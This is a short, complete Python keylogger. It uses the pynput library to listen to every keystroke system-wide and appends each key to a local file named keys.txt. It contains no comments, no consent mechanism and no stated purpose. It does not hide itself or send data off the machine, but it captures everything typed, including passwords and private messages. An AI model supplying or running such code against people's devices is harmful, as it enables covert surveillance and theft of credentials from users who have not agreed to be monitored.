from pynput.keyboard import Listener

def log_key(key):
    key = str(key).replace("'", "")
    with open("keys.txt", "a") as file:
        file.write(key + "\n")

with Listener(on_press=log_key) as listener:
    listener.join()
